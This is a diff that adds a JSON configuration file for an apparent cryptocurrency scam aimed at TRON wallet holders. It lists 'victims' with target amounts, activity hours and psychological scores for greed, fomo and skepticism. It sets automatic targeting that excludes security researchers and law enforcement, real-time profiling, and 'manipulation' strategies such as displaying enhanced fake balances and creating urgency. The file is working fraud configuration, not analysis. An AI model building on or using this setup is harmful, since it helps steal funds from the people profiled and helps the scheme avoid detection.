@@ -1,0 +1,99 @@
+{
+  "victims": [
+    {
+      "address": "TExampleVictimAddress1234567890123",
+      "profile": {
+        "type": "whale",
+        "trustLevel": "high",
+        "riskTolerance": "medium",
+        "experience": "intermediate",
+        "targetAmount": 100000
+      },
+      "behavior": {
+        "activeHours": [9, 10, 11, 14, 15, 16, 20, 21],
+        "preferredDapps": ["stake.com", "sunswap"],
+        "avgTransactionSize": 5000,
+        "transactionFrequency": "daily"
+      },
+      "psychProfile": {
+        "greed": 75,
+        "fear": 30,
+        "fomo": 85,
+        "skepticism": 20,
+        "socialProof": 90
+      }
+    },
+    {
+      "address": "TExampleVictimAddress2234567890123",
+      "profile": {
+        "type": "retail",
+        "trustLevel": "medium",
+        "riskTolerance": "low",
+        "experience": "beginner",
+        "targetAmount": 5000
+      },
+      "behavior": {
+        "activeHours": [19, 20, 21, 22],
+        "preferredDapps": ["justlend"],
+        "avgTransactionSize": 500,
+        "transactionFrequency": "weekly"
+      },
+      "psychProfile": {
+        "greed": 60,
+        "fear": 70,
+        "fomo": 80,
+        "skepticism": 40,
+        "socialProof": 85
+      }
+    }
+  ],
+  
+  "targeting": {
+    "autoDetect": true,
+    "criteria": {
+      "minBalance": 1000,
+      "maxBalance": 10000000,
+      "activityLevel": "medium",
+      "dappUsage": true
+    },
+    "exclusions": [
+      "exchanges",
+      "knownContracts",
+      "securityResearchers",
+      "lawEnforcement"
+    ]
+  },
+  
+  "profiling": {
+    "enabled": true,
+    "updateFrequency": "realtime",
+    "factors": [
+      "transactionHistory",
+      "balanceFluctuations",
+      "dappInteractions",
+      "socialConnections",
+      "timePatterns"
+    ]
+  },
+  
+  "manipulation": {
+    "strategies": {
+      "highTrust": {
+        "approach": "legitimate",
+        "showRealBalance": true,
+        "allowFullTransfers": true
+      },
+      "mediumTrust": {
+        "approach": "cautious",
+        "showRealBalance": true,
+        "allowFullTransfers": true,
+        "injectDoubt": false
+      },
+      "lowTrust": {
+        "approach": "aggressive",
+        "showEnhancedBalance": true,
+        "createUrgency": true
+      }
+    }
+  }
+}
